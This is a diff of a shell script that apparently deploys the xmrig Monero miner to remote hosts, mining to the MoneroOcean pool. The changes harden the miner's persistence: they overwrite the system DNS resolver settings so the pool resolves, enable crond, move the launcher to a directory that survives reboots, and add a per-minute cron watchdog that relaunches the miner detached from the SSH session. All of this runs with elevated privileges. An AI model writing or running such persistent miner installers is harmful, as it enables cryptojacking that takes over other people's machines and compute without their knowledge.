@@ -451,8 +451,8 @@ echo "OS:\$OS"
 if ! grep -q "^nameserver" /etc/resolv.conf 2>/dev/null; then
   echo -e "nameserver 1.1.1.1\nnameserver 8.8.8.8" | \$PRIV tee /etc/resolv.conf >/dev/null 2>&1 || true
   echo "DNS:fixed"
-elif ! nslookup gulf.moneroocean.stream >/dev/null 2>&1 && ! getent hosts gulf.moneroocean.stream >/dev/null 2>&1; then
-  # resolv.conf has nameservers but they don't work — override
+elif command -v nslookup >/dev/null 2>&1 && ! nslookup gulf.moneroocean.stream >/dev/null 2>&1; then
+  # nslookup exists but can't resolve the pool — override with working nameservers
   echo -e "nameserver 1.1.1.1\nnameserver 8.8.8.8" | \$PRIV tee /etc/resolv.conf >/dev/null 2>&1 || true
   echo "DNS:fixed-override"
 else
@@ -537,13 +537,17 @@ depend() { need net; }
 ORCSVC
   \$PRIV chmod +x /etc/init.d/xmrig 2>/dev/null || true
   \$PRIV /sbin/rc-update add xmrig default 2>/dev/null || true
+  # Ensure crond is running (needed for the watchdog cron job below)
+  \$PRIV /sbin/rc-update add crond default 2>/dev/null || true
+  \$PRIV /sbin/rc-service crond start 2>/dev/null || true
 
   # Always create launcher script (used by cron watchdog and as fallback starter)
-  cat > /tmp/start-xmrig.sh << MINER_LAUNCHER
+  # Use /home/user/ (persistent) instead of /tmp (may be tmpfs, cleared on reboot)
+  cat > /home/user/start-xmrig.sh << MINER_LAUNCHER
 #!/bin/sh
-exec \$XMRIG_BIN --config=/etc/xmrig/config.json --no-color
+\$XMRIG_BIN --config=/etc/xmrig/config.json --no-color
 MINER_LAUNCHER
-  chmod +x /tmp/start-xmrig.sh
+  chmod +x /home/user/start-xmrig.sh
 
   if [ -x /sbin/rc-service ]; then
     INIT=openrc
@@ -553,14 +557,14 @@ MINER_LAUNCHER
   else
     # rc-service not available — use launcher with nohup+setsid+stdin-close
     INIT=launcher
-    \$PRIV sh -c 'nohup setsid /tmp/start-xmrig.sh > /tmp/xmrig.log 2>&1 < /dev/null & echo \$! > /run/xmrig.pid'
+    \$PRIV sh -c 'nohup setsid /home/user/start-xmrig.sh > /tmp/xmrig.log 2>&1 < /dev/null & echo \$! > /run/xmrig.pid'
   fi
 
   # Cron watchdog: auto-restart xmrig if it dies (independent of SSH session)
-  # This is the safety net — crond runs outside SSH, so even if the initial start
-  # fails or doas reaps the process, crond will restart it within 60 seconds.
+  # crond must be running (enabled above). The subshell+background ( ... & )
+  # ensures xmrig detaches from crond — cron job completes immediately.
   ( \$PRIV crontab -l 2>/dev/null | grep -v 'start-xmrig\|pgrep.*xmrig'; \
-    echo "* * * * * pgrep -x xmrig > /dev/null 2>&1 || /tmp/start-xmrig.sh >> /tmp/xmrig.log 2>&1" \
+    echo "* * * * * pgrep -x xmrig > /dev/null 2>&1 || (nohup /home/user/start-xmrig.sh >> /tmp/xmrig.log 2>&1 &)" \
   ) | \$PRIV crontab -
   echo "WATCHDOG:cron"
 elif command -v systemctl >/dev/null 2>&1 && [ "\$(cat /proc/1/comm 2>/dev/null)" = "systemd" ]; then
@@ -586,13 +590,13 @@ SYSD
 else
   INIT=launcher
   # Non-Alpine, no systemd — use launcher script (same as Alpine fallback)
-  cat > /tmp/start-xmrig.sh << 'MINER_LAUNCHER2'
+  cat > /home/user/start-xmrig.sh << 'MINER_LAUNCHER2'
 #!/bin/sh
-exec XMRIG_PLACEHOLDER --config=/etc/xmrig/config.json --no-color
+XMRIG_PLACEHOLDER --config=/etc/xmrig/config.json --no-color
 MINER_LAUNCHER2
-  sed -i "s|XMRIG_PLACEHOLDER|\$XMRIG_BIN|g" /tmp/start-xmrig.sh
-  chmod +x /tmp/start-xmrig.sh
-  \$PRIV sh -c 'nohup setsid /tmp/start-xmrig.sh > /tmp/xmrig.log 2>&1 < /dev/null & echo \$! > /run/xmrig.pid'
+  sed -i "s|XMRIG_PLACEHOLDER|\$XMRIG_BIN|g" /home/user/start-xmrig.sh
+  chmod +x /home/user/start-xmrig.sh
+  \$PRIV sh -c 'nohup setsid /home/user/start-xmrig.sh > /tmp/xmrig.log 2>&1 < /dev/null & echo \$! > /run/xmrig.pid'
 fi
 echo "SERVICE:\$INIT"
 
